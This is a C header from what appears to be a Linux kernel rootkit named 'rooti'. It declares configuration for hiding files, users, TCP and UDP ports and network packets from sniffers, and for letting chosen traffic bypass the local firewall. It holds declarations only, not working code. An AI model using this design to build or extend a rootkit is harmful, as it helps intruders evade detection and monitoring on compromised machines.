#ifndef _ROOTI_CONFIG_H
#define _ROOTI_CONFIG_H

#include <linux/types.h>
#include <linux/filter.h>
#include "policy.h"



// Names of files that should be hidden
extern const char *ROOTI_HIDDEN_FILES[];
extern const size_t ROOTI_HIDDEN_FILES_COUNT;

// Prefixes of names of files that should be hidden
extern const char *ROOTI_HIDDEN_FILES_PREFIXES[];
extern const size_t ROOTI_HIDDEN_FILES_PREFIXES_COUNT;

// Suffixes of names of files that should be hidden
extern const char *ROOTI_HIDDEN_FILES_SUFFIXES[];
extern const size_t ROOTI_HIDDEN_FILES_SUFFIXES_COUNT;

// Names of users that should be hidden
extern const char *ROOTI_HIDDEN_USERS[];
extern const size_t ROOTI_HIDDEN_USERS_COUNT;

// TCP ports that should be hidden
extern const unsigned short ROOTI_HIDDEN_TCP_PORTS[];
extern const size_t ROOTI_HIDDEN_TCP_PORTS_COUNT;

// UDP ports that should be hidden
extern const unsigned short ROOTI_HIDDEN_UDP_PORTS[];
extern const size_t ROOTI_HIDDEN_UDP_PORTS_COUNT;

#ifndef ROOTI_CONFIG_PCAP_FILTER_METHOD_PROG

// Set of network rules that define which packets should be hidden from sniffers.
extern const struct rooti_net_policy ROOTI_PCAP_POLICY;

#else

// BPF program which defines which packets should be hidden from sniffers.
extern struct sock_filter ROOTI_PCAP_BPF_PROG[];
extern const size_t ROOTI_PCAP_BPF_PROG_COUNT;

#endif

// Set of network rules that define which packets should bypass the local firewall.
// These rules will apply regardless of any other netfilter hooks installed.
extern const struct rooti_net_policy ROOTI_FW_POLICY;

#endif
